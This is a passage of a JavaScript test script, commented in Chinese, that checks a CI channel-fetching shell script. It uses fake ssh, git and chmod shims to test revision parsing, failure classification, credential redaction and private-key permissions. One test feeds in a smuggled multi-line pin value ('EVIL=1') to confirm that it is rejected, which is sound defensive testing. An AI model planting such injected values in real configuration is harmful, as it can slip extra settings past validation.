    const workflow = parseYaml(readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8'))
    const gateJob = workflow?.jobs?.gate
    const gateSteps = Array.isArray(gateJob?.steps) ? gateJob.steps : []
    const resolveIndex = gateSteps.findIndex(step => typeof step?.run === 'string' && step.run.includes('--resolve-only'))
    check(resolveIndex >= 0, 'gate 必须有一处 `ci-channels.sh --resolve-only`(渠道仓 revision 的唯一解析点)')
    if (resolveIndex >= 0) {
      const step = gateSteps[resolveIndex]
      check(typeof step.id === 'string' && step.id !== '', '--resolve-only 步骤必须有 id(供 job output 引用)')
      check(
        typeof step.if === 'string' && step.if.includes('refs/tags/v'),
        '--resolve-only 只能在发布 tag 上跑(非 tag 没有 pin 语义,退回原行为)',
      )
      const declared = gateJob?.outputs?.channels_rev
      check(
        typeof declared === 'string' && declared.includes(`steps.${step.id}.outputs.channels_rev`),
        `gate 的 outputs.channels_rev 必须引用该步骤的输出(实际 ${JSON.stringify(declared)})`,
      )
      check(
        typeof step.run === 'string' && step.run.includes('>> "$GITHUB_OUTPUT"'),
        '--resolve-only 的输出必须写进 $GITHUB_OUTPUT(否则多 job 复用读不到)',
      )
    }
    // 其余调用点(三平台 + release)一律带同一个 pin 来源。
    const consumers = []
    for (const [jobId, job] of Object.entries(workflow?.jobs ?? {})) {
      for (const step of (Array.isArray(job?.steps) ? job.steps : [])) {
        if (typeof step?.run !== 'string' || !step.run.includes('ci-channels.sh')) continue
        if (step.run.includes('--resolve-only')) continue
        consumers.push({ jobId, step })
      }
    }
    check(
      consumers.length === 4,
      `渠道抓取调用点应为 4 处(三平台 + release),实际 ${consumers.length}:${consumers.map(c => c.jobId).join(', ')}`,
    )
    for (const { jobId, step } of consumers) {
      const pin = step?.env?.CI_CHANNELS_PIN
      check(
        typeof pin === 'string' && pin.includes('needs.gate.outputs.channels_rev'),
        `job ${jobId} 的渠道抓取步骤必须带 CI_CHANNELS_PIN: \${{ needs.gate.outputs.channels_rev }}(实际 ${JSON.stringify(pin)})`,
      )
    }
    const releaseNeeds = workflow?.jobs?.release?.needs
    check(
      Array.isArray(releaseNeeds) && releaseNeeds.includes('gate'),
      '`needs` 上下文只含直接依赖:release job 必须**直接** needs gate 才能读到 channels_rev',
    )
  }
}

// ---- 1h. 渠道仓凭据形态:SSH deploy key（推荐形态）在**有 stderr 噪声**时也必须解析出 revision ----
//
// 现场（2026-09-24 第七轮审计 R7-D P1-1，已 REPRODUCED）：新增的推荐形态
// （`CHANNELS_REPO_SSH_KEY`，只读 deploy key）在真实流水线上**必然失败** —— `--resolve-only`
// 用 `REMOTE_OUT="$(git ls-remote … 2>&1)"` 把 git 的 stderr 并进被 `awk 'NR==1'` 解析的
// 那条流，而 `prepare_channels_ssh` 每次新建**空的** known_hosts +
// `StrictHostKeyChecking=accept-new` ⇒ openssh 首次连接**必然**往 stderr 打一行
// `Warning: Permanently added '…' to the list of known hosts.` ⇒ `REV=Warning:` ⇒
// `require_pin_shape` 判红并打印「渠道仓 pin 形状非法」—— 报错指向 pin、与真因毫无关系；
// 而这一步是发布 tag 的 gate **第一步** ⇒ 三平台与 release 因 needs 全跳过 ⇒ **零交付**。
// 当时本文件对 SSH 形态零覆盖（全文无 `SSH_KEY`/`ssh`），唯一的 `--resolve-only` 用例走
// `CI_CHANNELS_URL` 指向本地仓库 ⇒ 不产生任何 stderr。
//
// 判据是**行为**而不是文本（夹具 = 假 `ssh` + 假 `git`，全走 PATH 替身，不碰网络）：
//   (a) 正常：stdout 一行 `<sha>\tHEAD` + stderr 有 accept-new 告警 ⇒ EXIT=0 且 `channels_rev=<sha>`；
//   (b) 凭据被拒（stderr 同时有 TOFU 告警）：`Permission denied (publickey)` ⇒ EXIT≠0、
//       分类为「凭据被拒」、**不出现**「pin 形状非法」这种误导信息、TOFU 告警不进错误诊断、
//       其余 stderr **原文**在日志里；deploy key 不回显；
//   (c) 别的 stderr（`Could not resolve host`）⇒ 分类正确；令牌不回显（含令牌带 `@`、
//       git 自己只剥到第一个 `@` 的形态）；
//   (d) 主机键分支只留主机键处置（不得残留复制粘贴来的「网络不可达」）；
//   (e) 静态面：`git ls-remote` 的捕获不得出现 `2>&1`、stderr 必须单独落文件；EXIT trap 只有一处。
{
  // 合成渠道仓（bare 形态：假 ssh 把它当远端，真 git 走完整的 ls-remote 协议）。
  const origin = fixtureRepo()
  fixtureCommit(origin, 'channels/official/README.md', 'first', '2026-09-01T10:00:00+08:00')
  const bare = join(tempDir('ci-channels-bare-'), 'repo.git')
  fixtureMustGit(origin, ['clone', '--bare', origin, bare])
  const headRev = fixtureMustGit(bare, ['rev-parse', 'HEAD'])
  check(/^[0-9a-f]{40}$/u.test(headRev), '夹具 bare 仓必须有一个 40 位 hex 的 HEAD')

  const realGit = execFileSync('bash', ['-c', 'command -v git'], { encoding: 'utf8' }).trim()
  check(realGit !== '', '夹具需要 PATH 上的真 git（假 git 要转发 ls-remote 给它）')

  const shimDir = tempDir('ci-channels-shim-')
  const sshLog = join(tempDir('ci-channels-sshlog-'), 'ssh.log')
  writeFileSync(sshLog, '')
  // 假 ssh：复刻 OpenSSH 在 `accept-new` + **首次连接**（known_hosts 不存在/为空）时的行为 ——
  // 先往 stderr 打主机键告警，再 exec 本地 `git-upload-pack <bare>` 把 ssh 远端调用变成本地
  // 调用。**真正驱动 git 的是它**，所以 stdout/stderr 的分流是 git 的真实行为，而不是替身
  // 自己编的。known_hosts 非空时不打告警（accept-new 的真实语义；也能发现"known_hosts 不再
  // 每次新建"这类夹具前提变化）。
  writeFileSync(join(shimDir, 'ssh'), [
    '#!/usr/bin/env bash',
    '# 假 ssh（PATH 替身，见 verify-ci-scripts.mjs 1h 的说明）。',
    'set -uo pipefail',
    'printf "%s %s\\n" "${FAKE_SSH_MODE:-ok}" "$*" >> "$FAKE_SSH_LOG"',
    'mode="${FAKE_SSH_MODE:-ok}"',
    'known_hosts=""',
    'for arg in "$@"; do',
    '  case "$arg" in UserKnownHostsFile=*) known_hosts="${arg#UserKnownHostsFile=}" ;; esac',
    'done',
    'if [ "$mode" != "hostkey" ] && [ -n "$known_hosts" ] && [ ! -s "$known_hosts" ]; then',
    '  printf "%s\\n" "tofu-warning" >> "$FAKE_SSH_LOG"',
    // 真 OpenSSH 的告警是 **CRLF** 结尾（本机真 ssh 实测 `hosts.\\r\\n`；见 ci-channels.sh
    // 里那条 `tr -d '\\r'`）—— 夹具必须同形，否则"过滤/判断忘了归一化换行"这类缺口测不出来。
    '  printf "%s\\r\\n" "$FAKE_SSH_TOFU_WARNING" >&2',
    '  printf "%s\\n" "$FAKE_SSH_HOSTKEY_ENTRY" >> "$known_hosts"',
    'fi',
    'case "$mode" in',
    '  ok) exec "$REAL_GIT" upload-pack "$FAKE_SSH_REPO" ;;',
    '  denied) printf "%s\\n" "git@github.com: Permission denied (publickey)." >&2; exit 255 ;;',
    '  hostkey) printf "%s\\n" "Host key verification failed." >&2; exit 255 ;;',
    '  nodns) printf "%s\\n" "ssh: Could not resolve hostname github.com: Name or service not known" >&2; exit 255 ;;',
    '  *) printf "%s\\n" "fake ssh: unknown mode" >&2; exit 255 ;;',
    'esac',
  ].join('\n') + '\n', { mode: 0o755 })
  // 假 git：`pass` 把一切转发给真 git（由 ci-channels.sh 导出的 GIT_SSH_COMMAND 调用同目录的
  // 假 ssh）；`echo-url` 直接回显消息后失败 —— 复刻 git 自己的错误文本（它会把 URL 打出来，
  // 令牌带 `@` 时只剥到第一个 `@`），用来验证脱敏。
  // 每次调用都把 argv 追加进 `$FAKE_GIT_LOG`（若给了）：**"git 到底有没有被调用"** 是几条
  // 判据的前置条件（pin 形状非法必须在任何 git 调用之前结束；空白 URL 形态下调用的是哪个 URL）。
  writeFileSync(join(shimDir, 'git'), [
    '#!/usr/bin/env bash',
    '# 假 git（PATH 替身，见 verify-ci-scripts.mjs 1h 的说明）。',
    'set -uo pipefail',
    'if [ -n "${FAKE_GIT_LOG:-}" ]; then printf "%s %s\\n" "${FAKE_GIT_MODE:-pass}" "$*" >> "$FAKE_GIT_LOG"; fi',
    'case "${FAKE_GIT_MODE:-pass}" in',
    '  pass) exec "$REAL_GIT" "$@" ;;',
    '  echo-url) printf "%s\\n" "$FAKE_GIT_STDERR" >&2; exit "${FAKE_GIT_EXIT:-128}" ;;',
    '  *) printf "%s\\n" "fake git: unknown mode" >&2; exit 127 ;;',
    'esac',
  ].join('\n') + '\n', { mode: 0o755 })
  // 假 chmod：记录 chmod **之前**的 mode，再转发给真 chmod（R8-D-12 的判据：私钥在
  // chmod 之前不得有任何组/其他可读窗口；`premode` 就是那个窗口的证据）。
  writeFileSync(join(shimDir, 'chmod'), [
    '#!/usr/bin/env bash',
    '# 假 chmod（PATH 替身，见 verify-ci-scripts.mjs 1h）。',
    'set -uo pipefail',
    'mode="${1:-}"; target="${2:-}"',
    // GNU stat 用 -c,BSD/macOS 用 -f %Lp（GNU 的 -f 是"文件系统状态"且**会成功**,
    // 所以只能放在 -c 失败之后的回落位;本仓既有夹具已假定 GNU coreutils,这里只是补齐)。
    'pre="$(stat -c %a "$target" 2>/dev/null || stat -f %Lp "$target" 2>/dev/null || echo missing)"',
    'if [ -n "${FAKE_CHMOD_LOG:-}" ]; then printf "mode=%s premode=%s target=%s\\n" "$mode" "$pre" "$target" >> "$FAKE_CHMOD_LOG"; fi',
    'exec "$REAL_CHMOD" "$@"',
  ].join('\n') + '\n', { mode: 0o755 })

  // openssh 的原文（accept-new 首次连接）+ 一条假的 known_hosts 记录。
  const tofuWarning = "Warning: Permanently added 'github.com' (ED25519) to the list of known hosts."
  const keyMarker = 'FAKE-DEPLOY-KEY-MARKER-7d9c'
  const gitLog = join(tempDir('ci-channels-gitlog-'), 'git.log')
  writeFileSync(gitLog, '')
  const fakeEnv = env => ({
    PATH: `${shimDir}:${process.env.PATH ?? ''}`,
    REAL_GIT: realGit,
    REAL_CHMOD: execFileSync('bash', ['-c', 'command -v chmod'], { encoding: 'utf8' }).trim(),
    FAKE_SSH_LOG: sshLog,
    FAKE_SSH_REPO: bare,
    FAKE_SSH_TOFU_WARNING: tofuWarning,
    FAKE_SSH_HOSTKEY_ENTRY: 'github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIfakefakefakefakefakefakefakefakefake',
    FAKE_GIT_LOG: gitLog,
    CI_CHANNELS_REPO: 'local/repo',
    ...env,
  })
  const resolveOnly = env => runChannels({
    source: undefined,
    refName: 'v9.9.9',
    ref: 'refs/tags/v9.9.9',
    dest: 'channels',
    list: 'r7d.list',
    args: ['--resolve-only'],
    env: fakeEnv(env),
  })
  // 非 tag 的**装载路径**（= ci.yml 四个生产调用点走的那条：真 clone / 真 fetch）。
  const loadPath = env => runChannels({
    source: undefined,
    refName: 'ci-probe',
    ref: 'refs/heads/ci-probe',
    dest: 'channels',
    list: 'r8d-load.list',
    env: fakeEnv(env),
  })
  const gitCalls = () => readFileSync(gitLog, 'utf8').split('\n').filter(Boolean)

  // (a) 正常形态：SSH deploy key + accept-new 的主机键告警都在场 ⇒ 仍必须解析出 revision。
  //     这一条正是本缺陷的判据（把实现改回 `2>&1` 必红）。
  {
    const resolved = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_SSH_MODE: 'ok' })
    const sshRuns = readFileSync(sshLog, 'utf8')
    check(
      sshRuns.split('\n').some(line => line.startsWith('ok ')),
      '夹具前置：假 ssh 必须被真的调用过（git 通过 GIT_SSH_COMMAND 解析 PATH 上的 ssh）—— '
        + '否则本用例是空断言，发现不了 stdout/stderr 合流',
    )
    check(
      sshRuns.includes('tofu-warning'),
      '夹具前置：首次连接必须真的产生了 accept-new 主机键告警（known_hosts 每次新建）—— '
        + '没有这行噪声，本用例就没有判别力',
    )
    check(
      resolved.status === 0,
      `SSH deploy key 形态下 --resolve-only 应成功（主机键告警只该在 stderr），实际 ${String(resolved.status)}：${resolved.stderr}`,
    )
    const lines = (resolved.stdout ?? '').split('\n').filter(Boolean)
    check(
      lines.length === 1 && lines[0] === `channels_rev=${headRev}`,
      `SSH 形态下 stdout 必须恰好一行 channels_rev=<HEAD sha>，实际 ${JSON.stringify(lines)}`
        + '（stderr 的 ssh 告警混进被解析的流 ⇒ REV=Warning:）',
    )
    check(
      !`${resolved.stderr ?? ''}`.includes('pin 形状非法'),
      '不得把 stderr 告警当成 revision —— 「pin 形状非法」在真因是 stderr 合流时纯属误导',
    )
    check(
      !`${resolved.stdout ?? ''}${resolved.stderr ?? ''}`.includes(keyMarker),
      'deploy key 不得出现在任何输出里',
    )
  }

  // (b) 凭据被拒（未注册的 deploy key / 失效的 PAT）：分类要指到凭据，且不得误导到 pin。
  {
    const denied = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_SSH_MODE: 'denied' })
    const err = `${denied.stderr ?? ''}`
    check(denied.status !== 0, '凭据被拒时 --resolve-only 必须非零退出')
    check(err.includes('症状=凭据被拒'), `凭据被拒必须被分类（实际日志：${err}）`)
    check(
      !err.includes('pin 形状非法'),
      '凭据被拒的诊断里不得出现「pin 形状非法」（解析与诊断分流后，失败路径根本走不到 pin 形状判据）',
    )
    check(
      err.includes('Permission denied (publickey)'),
      `其余 stderr 必须**原文**进日志（便于对照），实际日志：${err}`,
    )
    check(
      !err.includes('Permanently added'),
      'accept-new 的 TOFU 告警是正常副作用，不得混进失败诊断',
    )
    check(!err.includes(keyMarker), 'deploy key 不得随诊断回显')
  }

  // (c) 别的 stderr（网络不可达）：分类正确 + 令牌脱敏覆盖 `@` 形态。
  {
    const token = 'FAKEPAT1@FAKEPAT2'
    const dnsFailure = resolveOnly({
      CHANNELS_REPO_TOKEN: token,
      FAKE_GIT_MODE: 'echo-url',
      // git 自己的报错文本会回显 URL；带 `@` 的令牌形态下它只剥到第一个 `@`（R7-D P3-2）。
      FAKE_GIT_STDERR: `fatal: unable to access 'https://x-access-token:FAKEPAT1@FAKEPAT2@github.com/local/repo.git/': `
        + 'Could not resolve host: github.com',
    })
    const err = `${dnsFailure.stderr ?? ''}`
    check(dnsFailure.status !== 0, 'ls-remote 失败必须非零退出')
    check(err.includes('症状=网络不可达'), `Could not resolve host 必须分类为网络不可达（实际日志：${err}）`)
    check(
      !err.includes('FAKEPAT1') && !err.includes('FAKEPAT2'),
      `令牌（含 @ 形态的尾部）不得回显，实际日志：${err}`,
    )
    check(err.includes('<redacted>@github.com'), `脱敏必须覆盖 https://<userinfo>@host 全形态，实际日志：${err}`)
    check(!err.includes('x-access-token:FAKEPAT1'), 'x-access-token 字面形态也必须被吃掉')

    // 同一条分类在 **SSH 形态**下也要成立（ssh 自己的 DNS 失败文案与 https 的措辞不同）。
    const sshDns = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_SSH_MODE: 'nodns' })
    const sshErr = `${sshDns.stderr ?? ''}`
    check(sshDns.status !== 0, 'SSH 形态下 ls-remote 失败必须非零退出')
    check(
      sshErr.includes('症状=网络不可达'),
      `SSH 形态的 Could not resolve host 同样必须分类为网络不可达（实际日志：${sshErr}）`,
    )
    check(!sshErr.includes(keyMarker), 'SSH 形态的诊断同样不得回显 deploy key')
  }

  // (d) 主机键分支：只留主机键处置（历史上这里复制粘贴多打了一行「网络不可达」，给出相反建议）。
  {
    const hostkey = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_SSH_MODE: 'hostkey' })
    const err = `${hostkey.stderr ?? ''}`
    check(hostkey.status !== 0, 'SSH 主机键校验失败必须非零退出')
    check(err.includes('症状=SSH 主机键校验失败'), `主机键分支必须给出主机键处置（实际日志：${err}）`)
    check(
      !err.includes('症状=网络不可达'),
      '主机键分支只留主机键处置（不得残留复制粘贴来的「网络不可达」行——它给的是相反的建议）',
    )
  }

  // (f) 临时资源必须被**真的**清掉：SSH 私钥目录与 stderr 捕获文件都建在 TMPDIR 里，
  //     跑完不许留（"唯一那处 EXIT trap"要真有效，而不只是结构上只有一处）。
  //     这一条抓住过第一版实现的一个真缺陷：`X="$(new_temp_dir)"` 让登记发生在子 shell 里，
  //     表恒空 ⇒ trap 什么都没删、私钥留在 runner 上。
  {
    const tmpRoot = tempDir('ci-channels-tmpdir-')
    const cleaned = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_SSH_MODE: 'ok', TMPDIR: tmpRoot })
    check(cleaned.status === 0, `清理用例的前置：SSH 形态下 --resolve-only 应成功（实际 ${String(cleaned.status)}）`)
    const leftovers = readdirSync(tmpRoot)
    check(
      leftovers.length === 0,
      `跑完 TMPDIR 必须为空（私钥目录 / stderr 捕获文件靠唯一那处 EXIT trap 清理），实际残留 ${JSON.stringify(leftovers)}`,
    )
  }

  // (g) **clone 路径**（ci.yml 四个**生产**调用点走的那条）的凭据回显 —— R8-D-9 的另一半。
  //
  // 现场（已 REPRODUCED）：第七轮的脱敏/分类只加在 `--resolve-only` 上，而生产走 clone：
  // `git clone` 的 stderr 直接进 job log，基本认证密码含 `/` 时完整凭据原样回显 —— 判据形态
  // ≠ 生产形态的典型。这里两条判据：
  //   g1）假 git 保证"URL 带凭据"这一点成立（不依赖 git/curl 版本的报错措辞）；
  //   g2）真 git 的**生产形态**（password 含 `/`）端到端跑一遍，并用"URL 尾部仍在日志里"
  //       当前置条件 —— 否则"没看到凭据"可能只是因为 git 压根没回显 URL，而不是脱敏生效。
  {
    const password = 'FAKEPAT1/FAKEPAT2'
    const url = `https://x-access-token:${password}@github.com/local/repo.git`
    const before = gitCalls().length
    const leaked = loadPath({
      CI_CHANNELS_URL: url,
      FAKE_GIT_MODE: 'echo-url',
      FAKE_GIT_STDERR: `fatal: unable to access '${url}/': Repository not found`,
    })
    const out = `${leaked.stdout ?? ''}${leaked.stderr ?? ''}`
    check(
      gitCalls().length > before && gitCalls().some(line => line.includes('clone')),
      '夹具前置：clone 路径必须真的调用 git（否则这条用例是空断言，测不到 stderr 过滤）',
    )
    check(leaked.status !== 0, 'clone 失败必须非零退出')
    check(
      !out.includes('FAKEPAT1') && !out.includes('FAKEPAT2'),
      `clone 路径的失败诊断不得回显凭据（含 `/` 的密码形态；R8-D-9），实际：${out}`,
    )
    check(out.includes('<redacted>@github.com'), `clone 路径的诊断同样必须脱敏成 <redacted>@host，实际：${out}`)
    check(
      out.includes('症状=凭据权限不足或仓库不可见'),
      `Repository not found 必须归到 403/404 那一类（不是"网络不可达⇒重试"；R8-D-8），实际：${out}`,
    )

    // g2）真 git + password 含 `/`：**url-tail 前置条件**让这条非空洞。
    const realLeak = runChannels({
      source: undefined,
      refName: 'ci-probe',
      ref: 'refs/heads/ci-probe',
      dest: 'channels',
      list: 'r8d-real.list',
      env: {
        GITHUB_REF: 'refs/heads/ci-probe',
        CI_CHANNELS_URL: 'http://mirroruser:pa/ssWORD@127.0.0.1:1/x.git',
      },
    })
    const realOut = `${realLeak.stdout ?? ''}${realLeak.stderr ?? ''}`
    check(realLeak.status !== 0, '真 git 形态下 clone 失败必须非零退出')
    check(
      realOut.includes('127.0.0.1:1/x.git'),
      `前置条件：真 git 必须把 URL 打进诊断（否则"没回显凭据"是空洞的），实际：${realOut}`,
    )
    check(
      !realOut.includes('ssWORD') && !realOut.includes('mirroruser:pa'),
      `真 git 形态下含 / 的密码同样不得回显（R8-D-9 的生产形态），实际：${realOut}`,
    )
    check(realOut.includes('<redacted>@'), `真 git 形态下 URL 的 userinfo 必须被替换成 <redacted>@，实际：${realOut}`)
  }

  // (h) 私钥落盘窗口（R8-D-12）：fake chmod 记录 chmod **之前**的 mode。
  //     删掉 `chmod 600` ⇒ 记录里没有那个文件（红）；去掉 `umask 077` ⇒ premode=644（红）。
  {
    const chmodLog = join(tempDir('ci-channels-chmodlog-'), 'chmod.log')
    writeFileSync(chmodLog, '')
    const prepped = resolveOnly({
      CHANNELS_REPO_SSH_KEY: keyMarker,
      FAKE_SSH_MODE: 'ok',
      FAKE_CHMOD_LOG: chmodLog,
    })
    check(prepped.status === 0, `夹具前置：SSH 形态下 --resolve-only 应成功（实际 ${String(prepped.status)}）`)
    const chmodLines = readFileSync(chmodLog, 'utf8').split('\n').filter(Boolean)
    const keyLine = chmodLines.find(line => line.includes('id_ed25519'))
    check(keyLine !== undefined, `私钥必须有显式的 chmod 600（门禁钉住这条；实际记录：${JSON.stringify(chmodLines)}）`)
    check(
      keyLine !== undefined && keyLine.includes('mode=600'),
      `私钥必须被 chmod 600，实际：${String(keyLine)}`,
    )
    check(
      keyLine !== undefined && keyLine.includes('premode=600'),
      `私钥在 chmod **之前**就必须是 600（裸 > 重定向按 umask 022 建文件 ⇒ premode=644 的窗口，R8-D-12），实际：${String(keyLine)}`,
    )
    check(
      chmodLines.some(line => line.includes('mode=700') && !line.includes('id_ed25519')),
      `私钥所在目录必须有 chmod 700，实际：${JSON.stringify(chmodLines)}`,
    )
  }

  // (i) 空白 `CI_CHANNELS_URL` 不得遮蔽可用的 deploy key（R8-D-11）：形态判定与使用同源。
  {
    const before = gitCalls().length
    const blank = resolveOnly({
      CI_CHANNELS_URL: ' ',
      CHANNELS_REPO_SSH_KEY: keyMarker,
      FAKE_GIT_MODE: 'echo-url',
      FAKE_GIT_STDERR: 'fatal: unable to access: fake failure',
    })
    const calls = gitCalls().slice(before)
    check(blank.status !== 0, '假 git 失败时 --resolve-only 必须非零退出')
    check(calls.length > 0, '夹具前置：必须真的调用过 git（否则看不到选了哪个 URL）')
    check(
      calls.some(line => line.includes('git@github.com:')),
      `CI_CHANNELS_URL 是纯空白时必须回落 deploy key（ssh URL），实际调用：${JSON.stringify(calls)}`,
    )
    check(
      !calls.some(line => line.includes('x-access-token:') || /ls-remote --quiet\s+HEAD/u.test(line)),
      `纯空白的 CI_CHANNELS_URL 不得被拿去跑 git（那是"已设置"的误判，R8-D-11），实际：${JSON.stringify(calls)}`,
    )
    check(
      `${blank.stderr ?? ''}`.includes('channels credential form: ssh'),
      `启动必须打一行本次选用的凭据形态（不回显内容），实际：${blank.stderr ?? ''}`,
    )

    // 其余形态各打一行（同一函数判定，不可能"判定的"和"用的"不是同一个）。
    const urlForm = resolveOnly({
      CI_CHANNELS_URL: 'https://example.invalid/x.git',
      FAKE_GIT_MODE: 'echo-url',
      FAKE_GIT_STDERR: 'fatal: unable to access: fake failure',
    })
    check(`${urlForm.stderr ?? ''}`.includes('channels credential form: url'), 'CI_CHANNELS_URL 形态应报 url')
    const tokenForm = resolveOnly({
      CHANNELS_REPO_TOKEN: 'FAKEPAT-TOKEN-MARKER',
      FAKE_GIT_MODE: 'echo-url',
      FAKE_GIT_STDERR: 'fatal: unable to access: fake failure',
    })
    check(`${tokenForm.stderr ?? ''}`.includes('channels credential form: token'), 'PAT 形态应报 token')
    check(!`${tokenForm.stdout ?? ''}${tokenForm.stderr ?? ''}`.includes('FAKEPAT-TOKEN-MARKER'),
      '凭据形态那行只报形态，不得回显凭据内容')
    const noneForm = resolveOnly({})
    check(`${noneForm.stderr ?? ''}`.includes('channels credential form: none'), '无凭据时应报 none')
    check(noneForm.status !== 0, '无凭据必须 fail-loud')
    const sourceForm = runChannels({
      source: fakeChannelRepo(['official']),
      refName: 'ci-probe',
      ref: 'refs/heads/ci-probe',
      dest: 'channels',
      list: 'src.list',
    })
    check(`${sourceForm.stderr ?? ''}`.includes('channels credential form: source'),
      '已有检出目录(CI_CHANNELS_SOURCE)形态应报 source')
  }

  // (j) `CI_CHANNELS_PIN` 的**整值**形状判据（R8-D-13）：多行值必须在**任何 git 调用之前**
  //     就被判为"形状非法"（老写法是行匹配 ⇒ `<40hex>\nEVIL=1` 一路走到"渠道仓里没有 pin 的
  //     commit"才失败，报错指向 pin 不存在而不是 pin 非法）。
  {
    const before = gitCalls().length
    const multi = runChannels({
      source: undefined,
      refName: 'v9.9.9',
      ref: 'refs/tags/v9.9.9',
      dest: 'channels',
      list: 'r8d-pin.list',
      env: fakeEnv({
        CI_CHANNELS_PIN: `${'a'.repeat(40)}\nEVIL=1`,
        CI_CHANNELS_URL: `file://${bare}`,
        FAKE_GIT_MODE: 'pass',
      }),
    })
    const err = `${multi.stderr ?? ''}`
    const text = `${multi.stdout ?? ''}${err}`
    check(multi.status !== 0, '多行 pin 必须失败')
    check(err.includes('pin 形状非法'), `多行 pin 必须被判成"形状非法"（不是"pin 不存在"），实际：${err}`)
    check(!text.includes('EVIL=1'), 'pin 形状失败信息不得回显收到的值')
    check(
      gitCalls().length === before,
      `pin 形状非法必须在**任何 git 调用之前**中止，实际多出：${JSON.stringify(gitCalls().slice(before))}`,
    )
  }

  // (k) 传输失败的分类词表（R8-D-10）：git/ssh 的常见传输失败形态都要落到"网络不可达"，
  //     且分类不再依赖英文环境（脚本已钉 `export LC_ALL=C`，见 (e) 静态面）。
  {
    for (const form of [
      'ssh: connect to host github.com port 22: Network is unreachable',
      'fatal: unable to access \'https://github.com/x/y.git/\': Failed to connect to github.com port 443: Connection refused',
      'kex_exchange_identification: Connection closed by remote host',
      'ssh_exchange_identification: read: Connection reset by peer',
    ]) {
      const run = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_GIT_MODE: 'echo-url', FAKE_GIT_STDERR: form })
      check(
        `${run.stderr ?? ''}`.includes('症状=网络不可达'),
        `传输失败形态「${form}」必须分类为网络不可达，实际：${run.stderr ?? ''}`,
      )
    }
    for (const form of [
      'remote: Invalid username or token. Password authentication failed.',
      'fatal: unable to access \'https://github.com/x/y.git/\': The requested URL returned error: 403',
      'ERROR: Repository not found.',
    ]) {
      const run = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_GIT_MODE: 'echo-url', FAKE_GIT_STDERR: form })
      const err = `${run.stderr ?? ''}`
      check(
        err.includes('症状=凭据被拒') || err.includes('症状=凭据权限不足或仓库不可见'),
        `凭据类失败「${form}」必须指到凭据（不是"重试"），实际：${err}`,
      )
      check(!err.includes('症状=网络不可达'), `凭据类失败「${form}」不得被归成网络不可达（R8-D-8）`)
    }
    // 兜底分支仍在（"未分类"必须还能出现，否则上面的分类判据可能是恒真的）。
    const unknown = resolveOnly({ CHANNELS_REPO_SSH_KEY: keyMarker, FAKE_GIT_MODE: 'echo-url', FAKE_GIT_STDERR: 'totally unknown failure text' })
    check(`${unknown.stderr ?? ''}`.includes('症状未分类'), '未知症状仍须落到"未分类"兜底分支')
  }

  // (e) 静态面：解析只从 stdout 取 + 临时资源登记在当前 shell（不在子 shell）。
  {
    const text = readFileSync(channelsScript, 'utf8')
    // 只看**代码行**：注释里会出现"错误写法"的字样（本文件就解释了为什么不能那么写）。
    const codeLines = text.split('\n').filter(line => !line.trimStart().startsWith('#'))
    // 只认**真的执行** `git ls-remote` 的行（命令替换），注释与错误文案里的字样不算。
    const lsRemoteLines = codeLines.filter(line => /\$\(git ls-remote\b/u.test(line))
    check(lsRemoteLines.length === 1, `ci-channels.sh 应只有一处 \`git ls-remote\` 捕获，实际 ${lsRemoteLines.length}`)
    check(
      !/2>&1/u.test(lsRemoteLines[0] ?? ''),
      '`git ls-remote` 的捕获不得把 stderr 并进 stdout（`2>&1` 会让 ssh 的主机键告警被当成 revision）',
    )
    check(
      /2>\s*"\$ERRFILE"/u.test(lsRemoteLines[0] ?? ''),
      '`git ls-remote` 的 stderr 必须单独落文件（供失败诊断），stdout 只留 revision',
    )
    const exitTraps = text.split('\n').filter(line => /^\s*trap\s/u.test(line) && line.includes('EXIT'))
    check(
      exitTraps.length === 1,
      `EXIT trap 必须只有一处（两处会互相替换 ⇒ 私钥/临时目录滞留在 runner 上），实际 ${exitTraps.length}：${JSON.stringify(exitTraps)}`,
    )
    check(
      !codeLines.some(line => /\$\(new_temp_(?:dir|file)\)/u.test(line)),
      '临时资源登记必须在**当前 shell** 里做：`X="$(new_temp_dir)"` 会让 `TEMP_PATHS+=` 丢在子 shell（登记表恒空 ⇒ 清理什么都不删）',
    )
    check(
      codeLines.some(line => /new_temp_dir; CHANNELS_SSH_DIR="\$NEW_TEMP"/u.test(line))
        && codeLines.some(line => /new_temp_dir; CLONE="\$NEW_TEMP"/u.test(line)),
      'SSH 目录与克隆目录都必须走同一套临时资源登记（清理只在那唯一一处 trap 里做）',
    )

    // ---- R8-D-9/D-10/D-12 的**接线**判据：脱敏/诊断/整值形状都只有一个实现，且每条
    //      会出网的 git 调用都把 stderr 捕获下来（"新增调用点忘了过滤"是这类洞的复发形态）。
    //      脱敏正则的字符集里**不能有 `/`**：基本认证密码允许含 `/`，`[^/[:space:]]*`
    //      会在第一个 `/` 处停下，把密码尾部原样放进公开日志（R8-D-9 的根因）。
    const sedLines = codeLines.filter(line => line.includes('s#(https?://)'))
    check(sedLines.length === 1, `脱敏必须只有一处 scheme 锚定的 sed 规则，实际 ${sedLines.length}`)
    check(
      sedLines[0] !== undefined && sedLines[0].includes('[^[:space:]]*@'),
      `脱敏正则必须贪婪到本行最后一个 @（字符集里不得出现 /，R8-D-9），实际：${String(sedLines[0])}`,
    )

    // 每条**会出网**的 git 调用都必须把 stderr 捕获到临时文件（clone/fetch/ls-remote），
    // 失败再由 report_git_failure 统一脱敏 + 分类。
    // 只看**命令位置**的 git（`$(git …` / `git …` / `! git …`）：错误文案里的
    // `（git ls-remote 非零退出）` 也算"含 git"但不调用任何东西，必须排除。
    const networkGitLines = codeLines.filter(line =>
      /(?:^|[\s(]|\$\()git\s+(?:-C\s+"\$CLONE"\s+)?(?:ls-remote|clone|fetch)\b/u.test(line))
    check(networkGitLines.length >= 4, `会出网的 git 调用点应至少 4 处（ls-remote / fetch×2 / clone），实际 ${networkGitLines.length}`)
    check(
      networkGitLines.every(line => /2>\s*"\$[A-Z_]+"/u.test(line)),
      `每条会出网的 git 调用都必须把 stderr 捕获到文件（否则凭据原文进公开日志，R8-D-9），违规行：`
